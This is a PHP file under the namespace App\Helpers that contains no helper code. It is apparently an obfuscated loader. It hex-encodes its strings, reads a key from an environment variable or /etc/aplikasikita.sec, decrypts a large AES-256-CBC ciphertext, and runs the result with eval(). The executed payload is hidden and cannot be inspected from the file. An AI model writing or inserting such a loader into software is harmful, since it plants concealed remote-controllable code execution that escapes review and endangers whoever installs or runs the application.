<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('fBIn0+FkNPG1BO4gT+/61g==');

$c=base64_decode(

'BucIycIzMhxbzihBfLnvFknW7hm5oJ2r/BK8VM+uqynrtYmCsj67ckxIr5lpKA4tJxijzHQl2Hhs' .
'Oz2LiYe6k2F0D19PqHmqr+iGGvcqOPVSj/Bmy2mqH2SwIYVynl9Ph7yeImIHp0gRW2F2WLDq9SdG' .
'g2joo3xOFqAf0LIYv1Kb/hncqWspC9yHZ/KwDfAHGXmzduHwrDfzr7qENa12x7e86+4Jo1YxXSx2' .
'k5t67s8+pF82WXUy2FSJrJMxzyTXVDqVbsJbc8rmqWxsOj5Jmmdp0qw+dkFPZM5qTGRmxe9PmGm7' .
'FNdsFEoh+C/51STv2sXDYtpl5qPVyyEBxz/jLEH9M3bn6kHmL9yNOhhl5ezbeiRDEMiowtqH4Mde' .
'aIkAyzG3/ebC9UA0qF+p8bX7AfAjUCMRrBcqwlNAjfyXJHCsDu09O6VGdGmHD13dUrLQL6KJtl7w' .
'O1ZgqmFDS0JBvdx+HrgHirYJY0QAxm5lgK8e88ktJPFSmsryeXZ9logVGroLxAx/m2vuq1wSb7U7' .
'IwvD/dck60dHWKAmH2ZsDjI4+z92dKjPob90gQ4HDbLY7k78rcdKka+zVvzgLbL/3Y+/OmId6WJ/' .
'Bs6Td+0C7gLtYCo6Gjcc4dnGqj1PR0UpYA+RU8e2IqkB4fKtuGUtrtkYHTL33ZbBkyn9p4mfbImh' .
'SY3gY2MqQSIkGdOgRKO7oGVAwAONWHKrUL4PWxqquuU3Uj5eGEy3PXuN5eACn5Ir2yBBhDOPelzn' .
'lM+s7lg7zfqMJ0jHj2+rwadTGYLFaj5Yo0nNLeOt3NeTunv3d29lI3Ie2UeHkEeyw6bZw3QHBbG9' .
'BVWcgO8h3X1nyxcpkR4ynkmrAif4k9A2GZDv+jakx3mB1jmEo2y11avc8rc32sjSYTrfbp9h5JnY' .
'LyfMZoNhJBscfnTgl5Yx0JzK7QPhRdWpcKk4+nEvRUxLlVZfLe4Px9C2Pm27i9m2uKpKEtZtQg3R' .
'0wN8D3P/V6OrNPzAN8j28x5FbINkaaMkfkp/IZNKQUXaI+MVTllzJ102gyqumPcYf0VqEizxkc3O' .
'0KISuGCZ3GUHi5q/+QwQ0RyeRLFlDkNS5VXpzQE/DVMZYxdcniwtslq0nqvISoBn5PR2/5VIbjKD' .
'cNY79Mz+KtwHoogaZtlr6c4TD7vFF1pyI4Cpzfej3uqX4lDgh6pNOadndgUCBW2uiI0xNvpc3OZl' .
'1N2Jz9FTfy4m2P9ItDL/WwyYfd9PmWp1HtC1tLZSxAfHaWGlPGETfZv/8Ju1hQncajidTvtNA8zm' .
'+NmoejASKjPIampJCkIaL5BpSMovTNUXErvFAHKCL7amkB0tTPQIpMEOSBHkYwCVEIK2KPBnLIsS' .
'RhFHmmWcDbvxRKcXZIvLNf5xAZaEKILE2IE/P9hlum6Vypcw/ke7ONji+s6X1t+DMjC8hPhSyNBb' .
'IwtfLJ2IPkgVUdCd9j4D8kc55nmzKIX7yrrK87iCRqhP+RV63fsrB+oxhzhZ/xGzLriVKTpaLIna' .
'ggPRo+Dh6mpV00/JRAJowGmaf9ZendyDALz+JSlljgy2RzckRVClEs3l80ABNpPLutmdCZBzrFMf' .
'CCVfvX0e5zUN9mHBniFJbLO9ahH3KqRH0QvieBryPE5XENb4ZJKiZaQkZV13sXnJk/e6H8FwmxrZ' .
'l3sqvZxPwFsduQ0WoxOAtn4SW5pf4ZQDaDpv1TvQTyybQ6j9wo81y14uH+FuDS5AZv9ITK28+Jfg' .
'rShyQDSA8pC4cZTTZQEYtmPj4yj85j2+oeDa4jLFhs58QYOg5X8NX/xrtqwrJU49UKQ4zaB9xNib' .
'oVIUlYanQLTvwAgngIXrFuknpb1AkGMHdRrmtMUCU5/Yg9icFdRRTILGvg0Ub9mnvb3gdtjtgYqn' .
'bH3noiL5sXjWHFa4w47jFaWclkO9V0AOtiyM62Wq7JFg5S8nK9qdKYJPwF6s8Zg4Nhe4RnSqRPrp' .
'cZIHke9Nb5wFDB0X626zrl7ALj8desQs8Jy2Q6WSRx6yvMMp/e9h/BHeGWZ0BVwiwC3t1D/OLiax' .
'EY7PtoKk67HOvdUS7zLrBz+U/U+HdMBJImJxUzw2VVJRx13axr9PL/h9l55YYbvUzizA7lKswvOj' .
'+4XXIrQN7YlKEQsWfquYqbNBVc3KhaE56aj0NA+cByPA0PrN'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

